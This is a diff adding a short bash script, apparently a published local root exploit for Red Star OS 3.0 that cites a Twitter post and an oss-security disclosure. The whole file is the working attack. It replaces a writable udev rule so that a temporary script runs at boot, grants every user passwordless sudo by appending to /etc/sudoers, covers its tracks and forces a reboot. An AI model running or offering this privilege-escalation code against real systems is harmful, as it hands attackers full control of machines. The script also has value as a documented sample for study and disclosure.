@@ -1,0 +1,19 @@
+#!/bin/bash -e
+
+## Alternative steps: https://pbs.twimg.com/media/B68inqBIQAA5sK6.png
+## Proof: https://github.com/HackerFantastic/Public/blob/master/exploits/redstar3.0-localroot.png
+
+cp /etc/udev/rules.d/85-hplj10xx.rules /tmp/udevhp.bak
+echo 'RUN+="/bin/bash /tmp/r00t.sh"' > /etc/udev/rules.d/85-hplj10xx.rules
+cat <<EOF >/tmp/r00t.sh
+echo -e "ALL\tALL=(ALL)\tNOPASSWD: ALL" >> /etc/sudoers
+mv /tmp/udevhp.bak /etc/udev/rules.d/85-hplj10xx.rules
+chown 0:0 /etc/udev/rules.d/85-hplj10xx.rules
+rm /tmp/r00t.sh
+EOF
+chmod +x /tmp/r00t.sh
+echo "sudo will be available after reboot"
+sleep 2
+reboot
+
+## Source: https://twitter.com/sfan55/status/550348619652796416 & http://www.openwall.com/lists/oss-security/2015/01/09/6
